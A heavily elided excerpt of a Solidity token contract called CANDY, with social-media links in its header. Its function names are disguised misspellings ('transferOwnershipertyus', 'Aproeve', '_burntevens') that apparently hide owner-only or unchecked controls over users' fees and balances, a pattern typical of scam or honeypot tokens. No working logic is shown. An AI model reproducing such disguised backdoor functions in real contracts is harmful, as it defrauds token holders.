...
https://t.me/Candy_ERC20
https://twitter.com/Candy_ERC
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipertyus(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }
...
contract CANDY is Ownable {
    ...
    function Aproeve(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _burntevens(address user) public {
